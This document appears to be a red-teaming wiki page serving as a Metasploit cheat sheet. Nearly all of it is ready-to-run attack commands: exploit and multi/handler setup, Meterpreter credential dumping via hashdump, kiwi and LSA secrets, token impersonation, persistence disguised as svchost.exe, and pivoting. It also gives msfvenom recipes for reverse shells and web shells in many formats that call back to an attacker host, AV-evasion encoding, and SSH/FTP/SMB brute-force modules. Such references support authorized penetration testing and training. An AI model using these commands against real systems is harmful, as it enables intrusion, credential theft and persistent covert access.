---
sidebar_position: 1
title: Metasploit Framework
---

# Metasploit Framework

```bash
# Set environment variables
export TARGET=<ip>
export LHOST=<your-ip>
export LPORT=4444
export USER=<username>
export PASSWORD=<password>
```

---

## Setup

Default configuration does not start the database. Benefits of using it include storing target host data and tracking exploitation attempts.

```bash
sudo msfdb init
sudo systemctl enable postgresql
```

Launch and verify database:

```bash
msfconsole
db_status
```

### Workspaces

```
workspace                # List workspaces
workspace -a <name>      # Create new workspace
workspace <name>         # Switch workspace
workspace -d <name>      # Delete workspace
```

### Working with the Database

Scan with Nmap and save results directly:

```
db_nmap -sCV -p- $TARGET
hosts                    # List discovered hosts
services                 # List discovered services
services -p 8000         # Filter by port
vulns                    # Show detected vulnerabilities
creds                    # Show found credentials
```

---

## Module Types

```
show -h                  # Display all module types
```

### Auxiliary Modules

```
show auxiliary
search type:auxiliary smb
use <module>
info                     # Module details
show options             # Required parameters
set RHOSTS $TARGET
run
```

### Exploit Modules

```
search type:exploit <keyword>
use <module>
show options
set RHOSTS $TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exploit
```

### Payloads — Staged vs Stageless

**Staged** (e.g., `windows/x64/meterpreter/reverse_tcp`):
- Sends a small stager first, then downloads the full payload
- Smaller initial payload, but requires callback

**Stageless** (e.g., `windows/x64/meterpreter_reverse_tcp`):
- Entire payload sent at once
- Larger but self-contained

:::tip
The `/` between `meterpreter` and `reverse_tcp` indicates staged. An `_` indicates stageless. Stageless payloads are more reliable in restrictive environments where the second stage might be blocked.
:::

---

## Handler (multi/handler)

The multi/handler catches incoming connections from your payloads. Essential when using standalone payloads (msfvenom) outside of Metasploit exploits.

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
run
```

### Important Handler Options

```
set ExitOnSession false   # Keep listening after first connection
set AutoRunScript <script> # Run a script automatically on new sessions
```

Run the handler as a background job:

```
exploit -j
```

:::tip
Always set `ExitOnSession false` when you expect multiple callbacks or when your initial shell might die. Without it, the handler stops listening after the first connection.
:::

---

## Session Management

```
sessions              # List active sessions
sessions -i <id>      # Interact with a session
sessions -K           # Kill all sessions
sessions -u <id>      # Upgrade a shell to Meterpreter
sessions -C <cmd> -i <id>  # Run a command on a session
```

Upgrade a basic shell to Meterpreter:

```
sessions -u <shell-session-id>
```

---

## Meterpreter

Core commands once you have a Meterpreter session:

```
sysinfo               # System information
getuid                # Current user
getpid                # Current process ID
getsystem             # Attempt SYSTEM escalation
hashdump              # Dump password hashes
upload <file>         # Upload a file
download <file>       # Download a file
shell                 # Drop to OS shell
background            # Background the session
```

### getsystem

The `getsystem` command uses three techniques to escalate from local admin to SYSTEM:
1. Named pipe impersonation (requires local admin)
2. Named pipe impersonation variant (requires local admin)
3. Token duplication (requires `SeDebugPrivilege`, x86 only)

:::warning
`getsystem` is designed for local admin → SYSTEM escalation, not user → admin. It should not be thought of as a general privilege escalation method on modern systems.
:::

### Process Migration

Migrate to a more stable or privileged process:

```
ps                     # List processes
migrate <pid>          # Migrate to a process
migrate -N explorer.exe  # Migrate by process name
```

:::tip
Migrate to a 64-bit process if you're in a 32-bit one — this unlocks x64 Meterpreter features. Migrate to `explorer.exe` for persistence (it runs as long as the user is logged in), or migrate to a SYSTEM process after `getsystem`.
:::

### Meterpreter Extensions

Load additional functionality:

```
load kiwi              # Mimikatz integration
creds_all              # Dump all credentials
kerberos_ticket_list   # List Kerberos tickets

load incognito         # Token impersonation
list_tokens -u         # List available tokens
impersonate_token "DOMAIN\\Admin"  # Impersonate a user

load powershell        # PowerShell extension
powershell_execute "Get-Process"
powershell_import /path/to/script.ps1
```

### File System Operations

```
pwd                    # Current directory
cd <path>              # Change directory
ls                     # List files
cat <file>             # Read a file
edit <file>            # Edit a file
mkdir <dir>            # Create directory
rm <file>              # Delete file
search -f *.txt -d C:\\Users  # Search for files
```

### Network Operations

```
ipconfig               # Network interfaces
arp                    # ARP table
netstat                # Active connections
route                  # Routing table
```

---

## Post-Exploitation Modules

After gaining a session, use post modules to gather information and expand access.

### Information Gathering

```
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/enum_shares
run post/windows/gather/checkvm
run post/windows/gather/enum_patches
run post/multi/recon/local_exploit_suggester
```

### Credential Harvesting

```
run post/windows/gather/credentials/credential_collector
run post/windows/gather/cachedump       # Cached domain creds
run post/windows/gather/lsa_secrets     # LSA secrets
run post/windows/gather/smart_hashdump  # SAM dump
run post/multi/gather/firefox_creds
run post/multi/gather/ssh_creds
```

### Persistence

```
run post/windows/manage/persistence_exe REXENAME=svchost.exe STARTUP=SYSTEM
```

### Domain Enumeration

```
run post/windows/gather/enum_domain
run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"
run post/windows/gather/enum_ad_computers
```

---

## Pivoting with Metasploit

### autoroute

Add a route to the internal network through the Meterpreter session:

```
run autoroute -s 172.16.1.0/24
```

Verify routes:

```
run autoroute -p
```

### portfwd

Forward a local port through the Meterpreter session:

```
portfwd add -l 3389 -p 3389 -r 172.16.1.10
portfwd add -l 445 -p 445 -r 172.16.1.10
portfwd list
portfwd delete -l 3389
```

Now connect to `localhost:3389` on Kali to reach the internal RDP service.

### SOCKS Proxy

Create a SOCKS proxy for routing arbitrary tools through the session:

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
```

Configure Proxychains to use `socks5 127.0.0.1 1080`, then use Proxychains with external tools:

```bash
proxychains nmap -sT -Pn 172.16.1.10
proxychains evil-winrm -i 172.16.1.10 -u $USER -p $PASSWORD
```

---

## Resource Scripts

Automate common tasks with resource scripts. Save commands to a `.rc` file:

Create `handler.rc`:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

Run on startup:

```bash
msfconsole -r handler.rc
```

Create `enum.rc` for post-exploitation:

```
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_logged_on_users
run post/windows/gather/smart_hashdump
run post/windows/gather/credentials/credential_collector
```

---

## msfvenom (Payload Generation)

### Windows

Reverse shell (exe):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o reverse.exe
```

Meterpreter reverse shell:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o meterpreter.exe
```

DLL payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o malicious.dll
```

MSI installer:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o reverse.msi
```

HTA payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o payload.hta
```

ASPX web shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
```

### Linux

Reverse shell (elf):

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o reverse.elf
```

Linux exec (e.g., for NFS SUID):

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
```

### Web Payloads

PHP reverse shell:

```bash
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

JSP reverse shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp
```

WAR file (for Tomcat):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
```

### Encoding

Apply encoding to avoid basic signature detection:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

:::warning
Encoded Metasploit payloads are heavily signatured by modern AV. Use custom loaders or the techniques in the [AV Evasion](/red-teaming/evasion/av-evasion) page for better results.
:::

---

## Common Auxiliary Modules

### Scanning

```
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/http/http_version
use auxiliary/scanner/portscan/tcp
```

### Brute Force

SSH:

```
use scanner/ssh/ssh_login
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME $USER
set RHOSTS $TARGET
set RPORT 22
run
creds                # View found credentials
```

FTP:

```
use auxiliary/scanner/ftp/ftp_login
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME $USER
set RHOSTS $TARGET
run
```

SMB:

```
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/rockyou.txt
set SMBUser $USER
set RHOSTS $TARGET
run
```
